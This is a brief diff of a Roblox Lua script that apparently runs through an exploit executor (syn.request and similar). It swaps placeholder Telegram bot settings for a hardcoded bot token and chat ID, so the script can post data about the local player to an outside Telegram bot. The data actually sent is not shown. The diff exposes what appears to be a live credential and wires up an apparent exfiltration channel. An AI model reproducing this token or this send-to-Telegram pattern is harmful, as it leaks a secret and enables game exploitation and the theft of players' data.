@@ -7,8 +7,8 @@ local HttpService = game:GetService("HttpService")
 local LocalPlayer = Players.LocalPlayer
 
 -- Replace with your Telegram bot API endpoint (sendMessage URL)
-local TELEGRAM_URL = "https://api.telegram.org/bot<YOUR_BOT_TOKEN>/sendMessage"
-local TELEGRAM_CHAT_ID = "<YOUR_CHAT_ID>"
+local TELEGRAM_URL = "https://api.telegram.org/bot8446879035:AAH1DGTI_M8FAX0y0RNVv8q1k1MsOhMj6e4/sendMessage"
+local TELEGRAM_CHAT_ID = "2001061743"
 
 -- Executor request function
 local requestFunc = (syn and syn.request) or (http and http.request) or http_request or request
